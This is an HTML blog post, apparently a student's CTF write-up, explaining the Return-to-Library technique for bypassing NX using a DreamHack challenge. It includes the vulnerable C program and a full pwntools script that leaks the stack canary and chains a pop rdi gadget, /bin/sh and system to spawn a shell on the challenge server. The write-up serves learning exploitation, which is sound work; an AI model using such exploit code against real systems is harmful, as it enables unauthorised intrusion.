@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] RTL · whrds.log</title><meta name="description" content="※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ # Due to the exam period, I was unable to create original examples for some of the recently posted articles. # From the next practical session onward, I will create original examples and proceed. RTL Return to Library is a technique used to bypass NX-bit, which is one of the memory protection methods.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-rtl/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rtl/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rtl/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] RTL · whrds.log"><meta property="og:description" content="※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ # Due to the exam period, I was unable to create original examples for some of the recently posted articles. # From the next practical session onward, I will create original examples and proceed. RTL Return to Library is a technique used to bypass NX-bit, which is one of the memory protection methods."><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-rtl/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] RTL","description":"※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ # Due to the exam period, I was unable to create original examples for some of the recently posted articles. # From the next practical session onward, I will create original examples and proceed. RTL Return to Library is a technique used to bypass NX-bit, which is one of the memory protection methods.","datePublished":"2023-10-22","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-rtl/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-rtl/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] RTL</h1><p class="article-description">※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ # Due to the exam period, I was unable to create original examples for some of the recently posted articles. # From the next practical session onward, I will create original examples and proceed. RTL Return to Library is a technique used to bypass NX-bit, which is one of the memory protection methods.</p><div class="article-meta"><time datetime="2023-10-22">Oct 22, 2023</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections.</strong> <strong>※</strong></p>
+<p><strong># Due to the exam period, I was unable to create original examples for some of the recently posted articles.</strong></p>
+<p><strong># From the next practical session, I will create examples myself and proceed.</strong></p>
+<h3>RTL</h3>
+<p>Return to Library is an attack technique used to bypass NX-bit, one of the memory protection techniques.</p>
+<p>We will proceed with this technique using a problem from DreamHack.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/001.png" alt=""></p>
+<p>Looking at the protection technique, we can see that NX-bit is enabled.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/002.png" alt=""></p>
+<p>This is the view of permissions checked using gdb’s vmmap.</p>
+<p>We can see that the stack does not have execution rights due to the NX-bit.</p>
+<p>Therefore, using byte code such as Shellcode is almost impossible.</p>
+<p>To bypass this, we will use the code area of the library, which is one of the areas that still have execution rights.</p>
+<p>Shared libraries contain functions such as system and execve that can execute shells, so if we can use these functions with /bin/sh as an argument, we can obtain a shell.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+const char* binsh = &quot;/bin/sh&quot;;
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Add system function to plt's entry
+  system(&quot;echo 'system@plt&quot;);
+
+  // Leak canary
+  printf(&quot;[1] Leak Canary\n&quot;);
+  printf(&quot;Buf: &quot;);
+  read(0, buf, 0x100);
+  printf(&quot;Buf: %s\n&quot;, buf);
+
+  // Overwrite return address
+  printf(&quot;[2] Overwrite return address\n&quot;);
+  printf(&quot;Buf: &quot;);
+  read(0, buf, 0x100);
+
+  return 0;
+}
+</code></pre>
+<p>Looking at the problem code, there is a vulnerability that allows bypassing canary.</p>
+<p>Also, the string /bin/sh exists in the code.</p>
+<p>Using this part, we can use it as an argument for the system function.</p>
+<p>Since the system function requires one argument, we will use the pop rdi gadget, and then return from the system function.</p>
+<p>More</p>
+<h4>What is a gadget?</h4>
+<p>Generally, it refers to a “code snippet.”</p>
+<p>At first glance, this might sound confusing.</p>
+<p>I will explain using the ret gadget as an example.</p>
+<p>The ret gadget is literally a code snippet used to execute the ret command.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/003.png" alt=""></p>
+<p>The above image shows the end part of the main function.</p>
+<p>Functions that exit the main function use the assembly instruction ret when returning.</p>
+<p>At this time, the address of ret, 0x4012ce, can be a ret gadget.</p>
+<p>When we disassemble, there will be code snippets such as pop rdi, rsi, ret, and these parts are referred to as “<strong>gadgets</strong>.”</p>
+<p>First, we will perform the canary leak discussed in the canary section.</p>
+<p>Then, we will construct the payload by inserting pr + binsh + system in that order.</p>
+<p><img src="/assets/images/tistory/tistory-fb026a46c243/004.png" alt=""></p>
+<p>We can use the gadget at 0x400853, which is pop rdi; ret;.</p>
+<pre><code>from pwn import*
+
+p = remote('host3.dreamhack.games',19862)
+#p = process('./rtl')
+e = ELF('./rtl')
+
+#context.log_level='debug'
+
+payload =  b'A'*0x39
+
+p.sendafter(b'Buf: ', payload)
+p.recvuntil(payload)
+
+cny = u64(b'\x00'+p.recvn(7))
+print(&quot;canary : &quot;, hex(cny))
+
+system_add = e.sym['system']
+binsh_add = next(e.search(b'/bin/sh'))
+p_rdi = 0x0000000000400853
+ret = 0x0000000000400285
+
+payload = b''
+payload += b'a'*0x38
+payload += p64(cny)
+payload += b'a'*0x8
+payload += p64(ret)
+payload += p64(p_rdi)
+payload += p64(binsh_add)
+payload += p64(system_add)
+
+p.sendafter(b&quot;Buf: &quot;, payload)
+
+p.interactive()
+</code></pre>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-rtl/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
